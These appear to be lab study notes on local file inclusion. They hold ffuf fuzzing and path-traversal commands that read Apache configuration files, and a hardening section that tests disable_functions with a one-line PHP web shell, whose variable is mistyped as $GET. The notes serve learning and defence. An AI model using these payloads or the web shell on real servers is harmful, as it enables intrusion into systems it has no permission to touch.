```bash
# ffuf
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

# Busting the language sections.
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

# Prevention
```bash
find /etc -name php.ini 2>/dev/null
sudo nano /etc/php/7.4/apache2/php.ini

# Search for disable_function and add system
disable_functions = system, 

sudo nano shell.php
<?php system($GET["cmd"]);?>

sudo systemctl restart apache2
curl 10.129.29.112/shell.php?cmd=ls

# And looking at the logs we can see the system() has been disabled for 'security reasons'.
```